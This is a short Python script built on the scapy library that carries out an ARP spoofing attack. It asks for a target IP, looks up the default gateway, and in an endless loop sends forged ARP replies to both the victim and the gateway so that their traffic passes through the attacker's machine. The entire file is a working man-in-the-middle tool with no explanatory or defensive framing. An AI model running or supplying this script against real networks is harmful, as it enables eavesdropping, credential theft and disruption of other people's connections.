import scapy.all as scapy
import time
target_ip = input("target_ip: ")
print(scapy.getmacbyip(target_ip))

gateway_ip = scapy.conf.route.route("0.0.0.0")[2]

packet_victim = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = gateway_ip)
packet_gateway = scapy.ARP(op = 2, pdst = gateway_ip, hwdst = scapy.getmacbyip(gateway_ip), psrc = target_ip)

while True:
    scapy.send(packet_victim, verbose = False)
    scapy.send(packet_gateway, verbose = False)
    time.sleep(4)
